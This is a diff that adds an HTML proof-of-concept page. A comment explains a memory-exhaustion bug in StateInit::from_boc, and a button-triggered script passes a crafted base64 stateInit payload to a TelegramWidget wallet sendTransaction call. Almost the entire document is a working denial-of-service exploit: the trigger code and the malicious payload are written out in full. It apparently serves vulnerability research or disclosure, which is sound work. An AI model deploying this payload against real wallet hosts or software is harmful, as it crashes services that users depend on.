@@ -1,0 +1,22 @@
+<!doctype html><body>
+<!-- WC-2b: unchecked HashmapE label shift in StateInit::from_boc.
+     The 144-char stateInit is a valid single-root BoC (isValidCellBoc = Ok).
+     DictDataParser::remain_suffix_bit_len underflows after a 300-bit Short
+     label, then the Same label reads a 64-bit prefix_len (all ones) and does
+     BigUint <<= prefix_len without a bound -> 2^61-byte allocation -> abort.
+     Host: "memory allocation of 2305843009213693992 bytes failed" (exit 134).
+     DoS only. -->
+<button id="b">Open</button>
+<script>
+"use strict";
+document.getElementById("b").addEventListener("click", function () {
+  TelegramWidget.wallet.sendTransaction({
+    messages: [{
+      address: "EQAQAUqxkIId2T0l1v0CBjczoPW7pS-5pQ0-J2Ap1pvac9XY",
+      amount: "1",
+      stateInit: "te6ccgEBAwEAXwABAQwBApd/////////////////////////////////////////////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAgIAEd//////////8A=="
+    }]
+  }, "x");
+});
+</script>
+</body>
